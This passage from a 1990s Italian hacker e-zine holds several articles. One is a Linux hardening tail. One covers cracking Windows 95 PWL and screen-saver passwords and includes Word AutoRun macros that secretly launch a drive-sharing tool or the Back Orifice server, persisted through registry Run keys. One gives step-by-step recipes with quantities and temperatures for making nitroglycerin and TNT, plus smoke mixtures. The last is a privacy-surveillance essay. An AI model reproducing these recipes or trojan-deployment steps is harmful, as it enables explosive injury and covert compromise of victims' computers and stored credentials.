All'inizio della riga ftp andate ad inserire un cancelletto, stessa cosa per
tenet e gopher, idemper shell login, talk, htalk, pop-2, pop-3, imap, finger,
time e auth.
Sara' possibile comunque abilitare questi demoni togliendo il cancelletto ed
eseguendo l'istruzione: "kill -HUP inetd".
Questa istruzione fa rileggere le configurazioni al demone inetd.
Sempre nella directory /etc esiste un file chiamato services che contiene la
lista di tutti i servizi disponibili e la porta a loro assegnata. E' sempre
consigliabile, nel caso in cui si voglia attivare un servizio, tipo ftp o
telnet, cambiare la porta di default.
Andiamo per esempio a cambiare la porta dell'ftp. Andate sulla riga ftp e al
posto di ftp scrivete ddftp, andate alla fine del file ed inserite la riga
ftp 2 volte il tasto TAB 2020/tcp. D'ora in poi quando attiverete l'ftp nel
file inetd.conf il vostro servizio sara' sulla porta 2020.
Editate il file hosts.deny e aggiungete alla fine del file la riga:
"ALL : ALL", in questo modo nesun host remoto e' abilitato alla
connessione sul vostro sistema, quando dovrete abilitare un servizio
ricordatevi di aggiungere l'ip della persona interessata al vostro
hosts.allow .
Questo discorso (TCP Wrappers) verra' affrontato piu' approfonditamente
nell'articolo di Predator.
Per ora la sicurezza de vostro sistema e' accettabile, nella prossima
parte installeremo dei log-daemon e faremo i raggi x al sistema di
system-logging di Linux (utmp, wtmp, lastlog, messages ecc...).
Ciao ragazzi a presto!
                                  |scacco|
                           assistente alla produzione ~Sh4mp00~

-----------------------------[ WiND0WS E PASSW0RD ]---------------------------
-----------------------------------[ Cavallo ]--------------------------------

                (* Best Viewed with Turbo Pascal Editor  =) *)

program Winpass;

uses Windows,My_Brain;

CONST (*e che restino CONST, no lame rip !!! *)
Autore    := 'Cavallo de Cavallis';
Soggetto  := 'Le Password in Windows ''95 : PWL e Screen Saver';
Cibo[1]   := 'Una bruschetta (pomodoro-origano-mozzarella)';
Cibo[2]   := 'Patatine PAI Antica Ricetta Autentica Trattoria';
Bere      := 'Mezza Bottiglia di Gatorade al Limone';
Musica[1] := 'Anthrax - Sound of White Noise';
Musica[2] := 'Nirvana - Last Concert in Italy - Roma ''94';
Saluti[1] := 'PigPen, xche' (fuori) come te non c''e'' nessuno';
Saluti[2] := 'Dr_Slump, x gli Mp3 e xche'' di queste cose non capisci un caz';
Saluti[3] := 'DreadNought e Dashie, ci laureremo mai ??';
Saluti[4] := 'SoftProject, Orda delle Badlands e tutte le gnocche del mondo';
Fuck[1]   := 'Telekazz, dateci la tariffa FLAT !!';
Fuck[2]   := 'Giornalisti coglioni';

begin

Questo articolo e' dedicato a waterfox, un tipo incontrato su mp3.it che mi
diede del pazzo e che sosteneva che solo il Back Orifice potesse mostrare
le password di windows. Questo e' per te, leggi e impara!

Diciamo che questo articolo prende spunto un po' (solo un po') dal 'come
fottere le password sotto Windows '95' che trovate sulla mia home page
(http://fly.to/cavallo), ma non solo, mica posso riportare "paro-paro"
er mio articolo, poi mi si viene addire che non faccio mai un cazzo.... =)
In questo articolo cerchero' di entrare un po' piu' in deep su questi
argomenti:

Nota Iniziale: Tutti i programmi di cui parlero' li trovate all'url:
http://softpj98.bbk.org/cavallo/
Se non li trovate e' xche' o siete incapaci o ci siamo dimenticati di
metterli (HIHI evviva l'organizzazione).

[1] File PWL
[2] Password dei Screen Saver e delle Condivisioni

Iniziam subito, che e' meglio:

[1] * File PWL *

<nota : per questa parte mi sono ispirato (ispirato non rippato) a quel che
si puo' trovare in giro, per esempio nelle guide di alcuni dei programmi che
troverete citati in questo articolo>

Allora PWL sta per PassWord List, trattasi di un file "cryptato" (il perche'
delle " " lo capirete in seguito) che contiene le password che salviamo
mentre siamo in winsozz, questo include:
* Password di connessione a Internet (Dialup)
* Siti (Porno ovviamente =)) che visitiamo con l'amato Internet Exploder
* Accessi a Reti (NT, Novell, Microskif Network)
* Accessi a server (via Cavo, Remoti etc...)

In sintesi tutto cio' che riguarda connessione & (in)sicurezza di Windows.

Questo (ma possono anche essere piu' di uno, uno per utente) simpatico file
lo si trova ovviamente nella directory di Windows e, se non ricordo male,
non e' neanche settato Hidden (ma a chi fa paura un +h ?).

Ora veniam un attimo a illustrare come e' fatto sto file o meglio il suo
nome, visto che molti non hanno ben capito come esso sia; prediamo per
esempio l'utente Marco, esso avra' come file di password MARCO.PWL, ma
l'utente <Eddie Irvine> cosa avra' come nome del file?? eddie.pwl?
irvine.pwl? eddie irvine.pwl?  No No No!!!
Windows 95 pur avendo portato le mirabilie (hihi) dei 255 caratteri nei nomi
dei file permettendo a NOI di usare i nomi lunghi pare che questi A LUI stian
sul cazzo (questo fa capire quanto si autostimino i programmattori) e quindi
usa il sacro 8.3 del DOS per i file essenziali del sistema, inclusi i pwl.
E allora come caz e' lo username del pwl ? Innanzi tutto scordatevi gli spazi,
e troncate tutto all'8vo carattere, es EDDIEIRV.PWL; voi direte: "embe'
chemmefotte io quando trovo il pwl me lo piglio qualsiasi nome esso abbia",
questo e' vero MA se voi volete decryptare il contenuto del file (con uno
dei programmi di cui vi parlero' in seguito) dovete conoscere anche lo
username COMPLETO e cioe' <Eddie Irvine>, ora in questo caso era facilmente
guessable, ma se vi trovate una cosa un po strana tipo STUDIOTE.PWL come caz
vi viene in mente che lo username e' STUDIO TECNICO ROSSI?!?!?!?!?
Ovviamente c'e' il modo per saperlo e mo' ve lo spiego...
Come voi tutti saprete (e se non lo sapete, vi diseredo) esistono un paio di
file INI di configurazione di windows: in questo caso siamo interessati al
SYSTEM.INI, sotto la voce "Password Lists" troverete molto vogliosi di essere
zappati i riferimenti al full username e al file pwl es:

[Password Lists]
STUDIO TECNICO ROSSI=c:\windows\studiote.pwl
PAOLO ROSSI=c:\windows\paoloros.pwl

E' il caso di segnarseli no ? =))

C'e' un ulteriore problema, perche' i tipi zozzi della M$ saranno idioti, ma
quantomeno permettono di avere una password di avvio per l'utente, questa
password determina la cryptazione (o cryptaggio? no questo mi sa tanto
di risotto ai 4 cryptaggi =) vabbe' chiamamolo il crypting) delle risorse
(user e pass di www.gnocca.org, connessione a tin etc..) ergo no password
no decrypting (ma direi anche No Pain No Gain).

Vorrei aprire una parentesi su COME siano cryptati i file pwl:
ora posto il fatto che di crittografia so/capisco un cazzo evito di parlarvi
di come siano cryptate le risorse (mi pare algoritmo MD5) vi dico giusto
che il metodo di crypting della prima versione di Windows 95 (mi piacerebbe
controllare win31) e' diverso rispetto alle versioni piu' nuove di Windows,
questo perche' tempo fa venne rilasciato un programma, il famoso GLIDE che
permetteva di decryptare il file pwl molto semplicemente (se non erro in quel
caso non veniva utilizzata una password, ma solo lo username),e la M$ colta da
rimorso, o forse riempitasi di shit x la bella figura, rilascio' un service
pack (che in seguito divenne parte integrante di OSR2 e Win98) che modificava
la gestione delle password introducendo un paio di DLL: MSPWL32.DLL (e mi
pare anche MPR.DLL ma non ci metto il pisello sul fuoco) che venivano
utilizzate per la gestione delle password.

Ora dico questo perche' mi e' stato detto N volte con N tendente a +infinito
"ma il glide che c'e' sulla tua home page non va un cazzo", effettivamente e'
cosi' perche' oramai la maggior parte della gente ha versioni + nuove di Win
e quindi non serve quasi + a una sega, sono comunque nate nuove generazioni
di programmi che tengono conto del nuovo formato e agiscono su di esso.

Sottoparentesi della parentesi: avete mai notato che la M$ quando rilascia
service pack e patch non dica mai a cosa cazzo servano? Paura? Bah....

Nota: Se non erro il Service Pack che mette a posto il bug della sicurezza
dei Pwl contiene a sua volta un bug che corrompe il file PWL e non permette
di salvare altre risorse all'interno di esso, dovete quindi procurarvi la
Patch per risolvere questo problema (Ma dico io, e' possibile che uno debba
montare la Patch del Bug della Patch del bug?!?!)

Vabbe' comunque ora abbiamo quasi tutti le versioni nuove di Win, tutte
regolarmente acquistate e tutte regolarmente registrate presso Microsbronz =)
e quindi necessitiamo della password di avvio ed ora i modi per trovarla sono
un po' i soliti (provo a fare uno schema veramente squallido, premesso che io
abbia accesso al PC):

                   Posso eseguire programmi sul PC-Vittima?
                                  /        \
                                 /          \
                                /            \
                               SI            NO
                               |              |
                               |              |
                               |              |
                          Utente Loggato ?    |
                             /     \          |
                            /       \         |
                           /         \        |
                         SI          NO       |
                         |            |       |
                Utilizzo PwlCrack    Mi zappo il PWL
                (o PwlHack con /spy)      |
                                          |
                                Possiedo la Password?
                                    /      \
                                   /        \
                                  /          \
                                SI           NO
                                |             |
                                |             |
                      Utilizzo PwlHack  Utilizzo PwlHack
                      con opzione LIST    con opzione
                                            /     \
                                           /       \
                                          /         \
                                   VOCABULARY     BRUTEFORCE

[come sono bravo =))]

Praticamente se ho accesso FISICO al PC e l'utente e' loggato posso eseguire
il PwlCrack [che permette la visualizzazione delle risorse appartenti allo
utente corrente] altrimenti sono costretto a pigliarmi il PWL e a lavorarmelo
a casa con il PwlHack.
A dir la verita' la nuova versione del PwlHack (v4.02) permette con la
funzione /SPY di visualizzare questi dati e racchiude sia la visualizzazione
delle risorse all'interno dei pwl che delle password di condivisione.
Le opzioni Vocabulary e Bruteforce servono per trovare la password di logon
di Windows (e NON di connessione a internet come alcuni credono, questa pass
e' quella che permette di visualizzare TUTTE le risorse interne al file PWL,
che possono essere dei tipi di cui ho parlato sopra) utilizzando i metodi
"classici" di wordlist attack e di bruteforcing.
Con l'ultima grande versione del Pwlhack (grande hard wisdom, sarai sempre
nel mio cuore =)))) e' possibile configurare alcune cosucce varie come
scheduling, intervallo di bruteforcing (da AAAA a ZZZZZ x es.) e altre
cosucce nonche' vi e' stato un NOTEVOLE incremento della velocita', tant'e'
che sul mio portatile P90 son passato in vocabulary mode da 3500 a 11000
password al secondo.

Spero di essere stato quite chiaro, per i PWL e' tutto, con le info fornitevi
dovreste essere in grado di recuperare le risorse contenute in essi e farne
buon uso =)
Ricordo che il furto e l'utilizzo delle password e' illegale BLAH BLAH BLAH..

[2] * Password dello Screen Saver e delle Risorse *

<nota: l'idea di mettere questa parte sugli Screen Saver mi e' venuta leggendo
il "My Personal Cookbook" di Avatar>

Allora questi tipi di password NON sono memorizzati come si potrebbe pensare
nel file.pwl MA nel Registro di Windows, le key che dovete cercare sono le
seguenti:
(evito di spiegare cosa sia il registro e cosa siano le key contenute in
esso, per una volta voglio avere un po' di rispetto delle vostre conoscenze)

Password dello Screen Saver:
HKEY_CURRENT_USER/Control Panel/desktop/ScreenSave_Data

La password e' anch'essa cryptata, se volete toglierla sostituite la parte
di dati con hex 00.

Se volete invece scoprire qual e' la password, utilizzate il programma
Windows '95 Screen Saver Cracker v1.0 - coded by nobody
che permette di trovare la password O fornendo il path del registro O
passando come parametro un file.reg con l'esportazione della key.
La comodita' e' che non avete bisogno di avere accesso locale, ma basta
che possiate leggere (attraverso una rete locale per esempio) la dir di win
del PC-Vittima. 
P.S. A volte il programma perde qualche lettera, chissa'...

Password e settaggi delle Condivisioni:
(preso da un doc trovato sulla rete)

HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Network\Lanman

Sotto qui trovate i vari settaggi delle unita' e/o dei drive esempio:

...\LanMan\C

I dati contenuti sono i seguenti (esportati dal registro):

esempio di condivisione totale di C  (il doppio \ sarebbe singolo poi
all'interno del registro)

"Path"="C:\\"
"Type"=dword:00000000
"Parm1enc"=hex:
"Parm2enc"=hex:
"Remark"=""
"Flags"=dword:00000102

Osserviamo in dettaglio le caratteristiche:
-Path e' il path =)) (percorso completo della condivisione);
-Type dovrebbe essere se l'accesso e' a livello di condivisione (0) o di
 utente (1) (ma non ci giuro);
-Parm1enc  0 - 8 bytes Full Access Password;
-Parm2enc  0 - 8 bytes Read Only Password;
 (ovviamente vuoti se non ci sono pass settate)
-Flags sono : 0x101 Read-Only;
              0x102 Full Access;
              0x103 Depend On Password;
-Remark sono delle note (niente di interessante).

...\LanMan\MP3

come sopra, ma avremo come path c:\mp3 (per esempio)

Se avete accesso al registro potete riconfigurare un po' tutto =))
Ora io NON voglio incentivare l'utilizzo kattivo di queste cose MA si
potrebbe fare un mini-programmino che setti tutte le unita' come condivise
totalmente... (visto che quest'anno e' di moda il troiano =))

Ed infatti vi ho fatto un regalino, non ho avuto ancora modo di testarlo bene
(ho provato solo con un portatile collegato via cavo), ma parrebbe funzionare:
la piccola util Shareall.exe che trovate in allegato attiva la condivisione
totale senza password per tutte le unita' logiche presenti sulla macchina su
cui viene eseguita. Diciamo che e' un po' un aggiramento del problema xche'
ho agito modificando il registro invece che usare le DLL relative (di cui sto
cercando ancora di capire bene il funzionamento di NetShareAdd e affini)
cque, dicevo, la sua funzione pare farla, l'unico problema e' che le modifiche
sembrano attivarsi solo dopo il riavvio di windows (cazzo ci sara' una API che
avverte winzozz che son cambiate le condivisioni, ma non la trovo!).
[Nota: visto che anche il Delphi fa gli eseguibili piccoli? :))]
Ah beh ovviamente questa util la si puo' usare solo se uno ha gia' installato
il supporto per la condivisione dei file e delle stampanti (puo'servire pero'
nel caso qualcuno abbia condiviso solo parte delle unita' o  solo qualche
directory per avere full access su tutto =)).
Add-on: sono riuscito or ora a far in modo che il mio caro shareall (nome
completo Share All Your Knowledge v1.1 =)) attivi anche la condivisione di
file e stampanti, quindi l'unica richiesta e' che sia stato appunto
installato il supporto x lo sharing (vxd e madonne varie..), ad attivarlo
ci pensa lui! :)

Qualcuno si domandera' "come cazz faccio a fargli eseguire la tua piccola
utility??"
Beh semplice se avete accesso al drive C (e quindi a windows) potete metterla
o in C:\Windows\Menu Avvio\Esecuzione Automatica oppure mettete il link nel
registro (se ricordo bene e'
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
(o volendo mettetelo in RunOnce o RunServices) oppure ancora in win.ini
con un run=
"Eh se non abbiamo accesso al C?"  Beh raga un po' di inventiva, che ne dite
di modificare un documento aggiungendo una macro con nome "AutoRun"
(parte da sola) di questo tipo:

Sub MAIN
Shell("shareall.exe")
End Sub

Facile no? Gia' che ci sono vi butto qui anche una macro sempre da autorun
per montare il BO (visto che poi si cancella e se Word non lo trova si
incazza un tantino no ?):

Sub MAIN
FileTrova .PercorsoRicerca = "e:\", .Nome = "boserve.exe"
If ContaFileTrovati() > 0 Then Shell("boserve.exe")
End Sub

Vabbe' per questi trucchetti e' tutto, lascio alla vostra immaginazione
possibili utilizzi e varianti =), ora torniamo alle risorse condivise:

Se proprio volete visualizzare i settaggi e basta senza "ritoccarli" 
(qualcuno potrebbe accorgersene no? beh magari no, "i lamah sono tanti
milioni di milioni, i piu' grossi son coglioni.." :)))) potete utilizzare
il Win 95 Shared Resources Viewer v1.1 o l'opzione SPY del Pwlhack
(vedi sopra) per vedere le pass e i settings (questo va eseguito in locale).

end;

Direi che ho scritto abbastanza bytes anche per questo numero, ci si vede
alla proxy.ma.it, per ulteriori informazioni scrivete a <cavallo@cryogen.com>

NOTA BENE: Potete mettere questo articolo sulla vostra home page purche'
manteniate intatto l'autore <Cavallo de Cavallis> e la sorgente <BFi #4>.

end.

Cavallo


==============================================================================
-------------------------------[ MiSCELLANE0US ]------------------------------
==============================================================================

-------------------------[ SC0NV0LGiMENTi TELLURiCi ]-------------------------
--------------------------------[ Dr.Bluedump ]-------------------------------

Autore: Dr. BlueDump
Consumo: 1 caffe' molto ristretto
         8 biscotti al ciokkolato
         1 toast liscio (fatto alle 23.00)
Saluti a: Dark Schneider, kLEiNEr, GREco, Tata
Musica ascoltata: Money (Pink Floyd)
                  The Unforgiven (Metallica)
                  Stairway to heaven (Led Zeppelin)
Dedicato a: kLEiNEr, Dashie, and all my friends.

Avviso:
Il contenuto dell'articolo e' da considerarsi a puro titolo informativo e
senza altri fini. L'autore non si assume nessuna responsabilita' di eventuali
danni causati a persone o cose dovute alla negligenza di chi ha abusato di
queste informazioni. Percio' ognuno e' responsabile di cio' che compie.

Premessa: 
E' la prima volta che scrivo su BFi e percio' devo dankerare il Dashie e lo
staff di BFi che me ne ha dato la possibilita'. Il mio compito e' di dare un
po' di vita alla sezione "miscellaneous" dato che mi hanno detto che in questi
tempi e' un po' troppo tranquilla. No problem, ci penso io. =)
Trattero' specialmente materia che riguarda il lato oscuro di ognuno di noi,
in quella parte del nostro io dove risiedono le voglie di distruggere; io vi
aiutero' a metterle in pratica. Mi interesso di esplosivi da quando avevo 9
anni e quindi ora che ne ho un bel po' di piu' penso di aver accumulato un
buona dose di nozioni che saro' felice di trapassare anche a voi. Scrivetemi
pure se avete nuovi suggerimenti o curiose novita', e' risaputo... non si
finisce mai di imparare.
Contattatemi a: dr.bluedump@usa.net

E ora via con i danni...

Ho gia' scritto in passato qualcosa riguardante i fondamenti della pirotecnica
intesa come la intendo io :) per cui chiedete a qualcuno per avere le lezioni
precedenti. In questo nuovo corso che terro' su BFi ci spingeremo al di la'
delle solite bombe artigianali, vi svelero' i segreti del TNT, del Napalm,
del C4, ma anche come fare fumogeni colorati e vari effetti pirici. Vabbe',
incominciamo subito dalle cose piu' leggere: la Nitroglicerina.

NITROGLICERINA
~~~~~~~~~~~~~~
La nitroglicerina e' un esplosivo diffuso in tutto il mondo che viene usato
nei piu' disparati casi, dalla demolizione di palazzi (muaha!) alle cave di
estrazione... Ecco cio' che vi occorre per farvene una scorta privata:
Una parte di glicerina deve essere "nitrata" con 6 parti di un acido misto.
L'acido e' composto dal 40% di acido nitrico e dal 60% di acido solforico.
L'acido solforico deve essere aggiunto LENTAMENTE con quello nitrico senza
movimenti bruschi. Il tutto deve essere fatto con assoluta fermezza.
Non mischiate questa sostanza ottenuta, con altre altrimenti...bum!. Ogni
parte di glicerina corrispondera' a circa 2.3 parti di nitroglicerina.
La temperatura, quando la glicerina verra' aggiunta all'acido, non dovra'
MAI essere superiore ai 25 gradi centigradi, per cui mi raccomando. Se cio'
dovesse verificarsi o se doveste vedere del fumo rossiccio, mettete la "massa"
di sostanza a bagno in acqua fredda il piu' velocemente possibile. Comunque non
prendete questo come un accorgimento di precauzione, se vi capita fate come
descritto, ma non e' detto che possa succedere. Ricordate che mischiare acidi
e' una delle cose piu' pericolose perche' potreste perderene il controllo. Ok,
la sostanza finale che avete ottenuto di colore grigiastro o quasi trasparente
e' la nostra amata nitroglicerina (nitro per gli amici).
Ma cosa si puo' fare con la nitro? beh, tante cose...una delle quali e'
direttamente collegata; il famoso TNT.

T.N.T  (Trinitrotoluene)
~~~~~~~~~~~~~~~~~~~~~~~~
Mischiate 170 parti di toluene con 100 parti di acido. L' acido e' composto
da: 2 parti di acido nitrico al 70% e da 3 parti di acido solforico al 100%.
Miscelate il tutto al di sotto dei 30 gradi centigradi. Lasciate l' ambiente a
questa temperatura per 30 minuti e attendete che i componenti si separino.
Prendete il mononitrotoluene (l'avete appena fatto) e mischiatene 100 parti
con 215 di acido. Quest'altro acido e' cosi' composto: 1 parte di PURO acido
nitrico e da 2 parti di acido solforico. Mantenete la temperatura a 60-70 gradi
finche' le sostanze non si sono lentamente mischiate. Alzate poi la temperatura
a 90-100 gradi e mantenetela per altri 30 minuti.
Il dinitrotoluene ottenuto andra' poi separato e mischiatone 100 parti con 225
di oleum al 20%, che e' acido solforico al 100%, e 64 parti di acido nitrico.
Tenete la temperatura a 95 gradi centigradi per 60 minuti e poi a 120 gradi per
altri 90. Separate il trinitrotoluene e intingetelo in acqua calda. Purificate
poi la polvere ottenuta con del benzene. Visto il complicato sistema di
produzione si consiglia di acquistare del TNT gia' pronto che sicuramente e'
piu' efficace del vostro. :D

Per concludere torniamo sul "soft" e eccovi una bella serie di sostanze per
produrre un po' di fumo colorato che in tanti casi si rileva di curioso ed
interessante utilizzo. Tutte le sostanze sotto elencate devono essere
polverizzate e mischiate con un macinacaffe' elettrico (ne assicura la perfetta
miscela e finezza), per poi essere pronte all'uso.

[Nero]

Cloroetano............... 60%
Antracene................ 20%
Polvere di magnesio...... 20%

[Marrone]

Nitrato di potassio...... 47.4%
Bario.................... 39.8%
Carbonato di calcio....... 4.9%
Sabbia.................... 4.0%
Zolfo..................... 3.9%

[Grigio]

Cloroetano............... 50%
Polvere di zinco......... 25%
Ossidi di zinco.......... 10%
Nitrato di potassio...... 10%
Cloroformio............... 5%

[Grigio 2]

Cloroetano............... 45.5%
Ossido di zinco.......... 45.5%
Silicato di calcio........ 9.0%

[Bianco]

Clorato di potassio...... 20%
Clorito di ammonio....... 50%
Naftalina................ 20%
Carbone.................. 10%

[Bianco 2]

Nitrato di potassio...... 48.5%
Zolfo.................... 48.5%
Zucchero.................. 3.0%

[Bianco 3]

Nitrato di potassio...... 50%
Zucchero................. 50%

[Giallo]

Nitrato di potassio...... 25%
Zolfo.................... 16%
Zucchero................. 59%

[Bianco 4]

Nitrato di potassio....... 6%
Solfato di antimonio...... 1%
Zolfo..................... 1%

[Giallo 2]

Nitrato di potassio....... 4%
Zolfo..................... 1%
Carbone................... 2%
Clorito di sodio.......... 3%

[Giallo 3]

Zolfo..................... 4%
Carbone................... 1%
Nitrato di potassio...... 24%
Carbonato di sodio........ 6%

[Rosso]

Nitrato di stronzio....... 4%
Scorza di arancia (!)..... 1%

[Rosso 2]

Nitrato di stronzio...... 11%
Zolfo..................... 4%
Carbone................... 1%
Carbonato di calcio...... 11%
Nitrato di potassio....... 1%

[Viola]

Solfato di antimonio...... 1%
Nitrato di stronzio....... 1%
Zolfo..................... 1%
Carbone................... 1%
Nitrato di potassio....... 3%

[Verde]

Nitrato di bario.......... 7%
Zolfo..................... 4%
Carbone................... 1%
Nitrato di potassio....... 1%

[Verde 2]

Clorato di bario.......... 9%
Scorza di arancia (!)..... 1%

[Blu]

Solfato di antimonio...... 2%
Zolfo..................... 4%
Nitrato di potassio....... 12%

E anche questa e' andata. Mi raccomando non fate troppi danni, cattivelli!!
Nelle prossime lezioni tratteremo in principio di roba pesante (vi svelero'
i segreti del Napalm e del C4) e come finale la fabbricazione di bombe ad
impatto. Siate pazienti ed attendente buoni, buoni la prossima release di BFi.
See you soon!
                                                        Dr. Bluedump
		   "datemi un compliatore e vi bludumpero' il mondo"

------------------------------[ PRiVACY DENiED ]------------------------------
---------------------------------[ Pr3DaToR ]---------------------------------

Consumo: 5 Marlboro Rosse Standard ("Il fumo nuoce gravemente")
         1 Fetta di torta
         1 Sessione al WC (non credo fosse la torta)
Saluti: |scacco|, sPIRIT, Kobaiashi, |TsUnAmI|, valerio, JollyBlue, |-JoKeR-|


Musica ascoltata: Securitron (Police State 2000)
                  FearFactory (oBsoLetE, 1998)
                  Edgecrusher (oBsoLetE, 1998)
                  Paranoid - Garbage (Version 2.0, 1998)

...E ci continuano ad osservare.
Sul numero 2 di BFi trovate le considerazioni di sPIRIT sul Grande Fratello e
su come lo stato italiano (...l'ho scritto con lettere minuscole di proposito)
sia sempre pronto & attento a fregarci. Vi state chiedendo come?
Ehehe...nel modo piu' semplice: sfruttando a suo vantaggio le azioni piu'
comuni che ci accompagnano per tutta la giornata, anche le piu' banali come,
ad esempio, una telefonata, l'utilizzo di una tessera magnetica o piu'
semplicemete il fatto di passeggiare per una citta'!
Immaginate cosa avviene ogni volta che alzate la cornetta del vostro bel
telefono per chiamare un amico o la morosa (o qualsiasi altra persona...insomma
farete pure una cazzo di telefonata da casa vostra!): ogni volta data, ora, 
numero chiamato e numero chiamante vengono registrati dalla Telecom.
Non parliamo poi dei telefoni cellulari!. Tutte le volte che accendete il
vostro telefonino la Tim (o qualsiasi altro gestore) e' in grado di risalire
alla vostra posizione geografrica e non crediate che tenendolo spento sarete
invisibili: basta che la batteria sia connessa e siete comunque rintracciabili.
E con i moderni sistemi di roaming vi possono seguire anche all'estero (per cui
se fate una rapina alla Banca d'Italia vi consiglio di evitare di tenere il
cellulare in tasca). Spero comunque che non sia questo il motivo per cui
producono batterie con durata sempre maggiore... Poi ci sono anche i furboni
come Omnitel che vi spediscono a casa il tabulato delle chiamate effettuate dal
vostro telefonino (attenzione, questo fatto e' causa di molti divorzi... state
attenti gente...).
Vi ricordo che il sistema di telefonia mobile, non solo rivela la vostra
posizione, ma anche l'intera conversazione che avete effettutato!!!. Con il
vecchio sistema TACS la cosa era particolarmente semplice: con uno scanner
dal valore di poche centinaia di migliaia di lire io mi sono ascoltato le
telefonate erotiche della mia vicina di casa (non sapete che sorpresa sentire
tutte quelle maialate...non sono piu' riuscito a guardarla in faccia per un
mese senza esplodere in una sonante risata :)). Con il sistema GSM la cosa e',
piu' che complicata, particolarmente costosa, ma comunque fattibile. Se un
giorno vostra moglie vi arriva all'improvviso con un calcio nei coglioni e vi
accorgete che il vostro conto in banca e' calato di circa un miliardino...
bhe...potete immaginare cosa sia successo.
Quindi se dovete fare telefonate particolarmente critiche vi consiglio
vivamente di utilizzare le immortali cabine telefoniche.
Ma esuliamo da questa breve panoramica del mondo della telefonia mobile per
entrare in quello delle tessere magnetiche. Ormai anch'esse, come del resto
anche i telefoni cellulari, sono diventate di uso comune.
Ogni volta che utilizzate il Bancomat per prelevare contante ora, luogo e
titolare del conto sono dati che vengono registrati. La stessa cosa vale per
l'uso di qualsiasi carta di credito.
Quando entrate nel vostro supermercato di fiducia per acquistare un po' di
viveri di prima neccessita' (birra, patatine, popcorn, ovetti Kinder 1 sorpresa
su 5 e i vigorsol senza zucchero che ti cambiano la vita) e pagate, ad esempio,
con la tessera sconto dei soci: quella gran figa della cassiera che sta di
fronte a voi, con quelle sue belle manine d'oro che oltre a far passare la
tessera nel lettore servirebbero a qualcos'altro, ha appena registrato (molto
probabilmente a sua totale insaputa) il vostro nome, cognome, indirizzo, data e
importo (non parliamo poi, in questo caso, dell'uso di Bancomat o cc altrimenti
rischiamo di diventare paranoici...ma non ridete troppo...vi siete mai chiesti
dove va a finire il vostro codice segreto una volta digitato sul tastierino?).
Chi di voi usa il telepass per pagare il tratto autostradale? Bhe sappiate che
tutte le volte che ne fate uso ora, data, tratto e dio solo sa cos'altro
vengono registrati (NB: quindi se avete fatto questa rapina alla Banca d'Italia
oltre ad avere gettato i vostri cellulari...evitate di imboccare l'autostrada
durante la fuga, il telepass non rende la cosa piu' rapida).
Anche quando siete in ritardo ad un appuntamento o state beatamente viaggiando
in una qualsiasi strada e per sfiga vi becca un autovelox (-> bestemmia <-),
ora, data, luogo, ecc. vengono registrati ed inviati a casa vostra. E come se
non bastasse il bel servizio fotografico a cui sarete sottoposti (spiacente...
non sarete pubblicati sul calendario Pirelli) puo' documentare anche con chi
eravate in compagnia. Quindi quando avete l'amante a bordo andate con cautela
e rispettate i limiti o saranno cazzi vostri. Di recente vi viene spedito solo
il verbale della contravvenzione ed il rispettivo bollettino per il pagamento;
la foto la potete vedere su richiesta (ecco un'altro bel sistema dei vigili
per fotterci).
Ma se vostra moglie gia' sospetta qualche cosa e intercetta la multa puo'
visionare lei stessa la bella foto ricordo in questione.
Anche passegiando tranquillamente per la citta' (non importa se con l'amante)
o entrando in metropolitana, lasciate sempre delle vostre traccie.
Sparse ci sono miriadi di telecamere che vi osservano ovuque: quando passate
davanti ad un ufficio postale, un grande negozio, negli autogrill, nelle
banche, nei parcheggi, nei distributori e recentemente, in alcune provincie
italiane, le potete trovare anche sotto i semafori o nelle piazze (dicono che
sia per la sicurezza del cittadino...). Senza contare che al giorno d'oggi
chiunque puo' comprare o costruirsi un piccolo "occhio elettronico" anche
dotato di infrarossi per una visione notturna ad un costo relativamente basso,
ma evitiamo di entrare nei particolari altrimenti rischiamo di ricadere di
nuovo nella paranoia. Insomma, tutte le volte che queste cazzo di telecamere
vi fanno un primo piano (e mi spiace darvi sempre brutte notizie...ma non e'
un provino per un film porno con le Spice Girls) venite archiviati con tanto
di data e ora per non si sa quanto tempo.
Dopo che avete lasciato le vostre traccie ovunque, alla sera finalmente
tornate a casa. Mangiate e vi gettate subito sul vostro PC per "navigare"
(argh! odio questo termine..). Siete dei web surfer professionisti
(hihihihi!!) ben informati sulle insidie della Grande Rete ed avete dunque
disabilitato tutti i biscottini (by sPIRIT) del vostro browser. Ora almeno la
vostra connessione Internet e' sicura.
Uhm si'...sicura come la mia 5c0p4t4 con Claudia Schiffer!
Benvenuti nell'apocalisse dell' antiprivacy. Ovunque navighiate, qualsiasi
cosa scriviate passa e viene registrata da decine e decine di sistemi.
Inviate delle password con il vostro browser per entrare in un sito porno
(maiali!) o per operazioni di home banking (no comment!) o inviate numeri di
carte di credito: bhe' vi dico solo una parola, lasciando al lettore le giuste
considerazioni...PACKET SNIFFER (che tradotto significa "siete fottuti").
L'email che inviate rimane nei backup del vostro provider per 1 settimana, come
del resto tutti i log dei collegamenti (che sono pure in chiaro e quindi
leggibili tranquillamente).
Inviate o ricevete email da un mailer gratuito...se non eseguite correttamente
la procedura di logout qualcuno puo' leggere la vostra posta. Da tenere in
considerazione "Hotmail.com" (che tradotto significa "se c'e' il tasto LOGOUT
usalo!") (-> questo e' riferito ad una certa persona di mia conoscenza...
LUI SA <-).
Quando effettuate una connessione con un altro host siete sicuri che i dati
vadano proprio a finire da lui? Provate a leggere gli articoli sull'IPSPOOFING
:) (che tradotto significa "Ma va a dar via il cul...").
Magari amate di piu' i colori, i suoni, le belle iconcine animate e puttanate
varie che la vostra sicurezza e quindi i vostri dati? Uhm...basta installare
Windows 98.
Ovviamente in questa sede ho un po' generalizzato i vari attacchi di cui
potrete essere vittima, elecando velocemte quelli principali e rimandando i
lettori a leggere i rispettivi articoli gia' pubblicati. Comuque non e' cosi'
semplice sniffare (i pacchetti intendo...quindi se un carabiniere o equivalente
sta leggendo il mio articolo...che non mi caghi il cazzo), spoofare o
exploitare il bug di Hotmail (che credo non sia piu' possibile...a proposito,
ma Hotmail non aveva a che fare con Microsoft? ;). Cio' richiede una certa
esperienza e particolari condizioni.
Bene bene, ora che avete lasciato le vostre traccie sparse anche per mezzo
mondo, ve ne andate a letto.
All'improvviso vi squilla il telefono. Vi alzate di corsa, un po' preoccupati
per l'ora e vi gettate sul telefono. Rispondete tremolanti ed una vocina soave
vi dice "Buona sera signore, lei e' affetto da emorroidi".
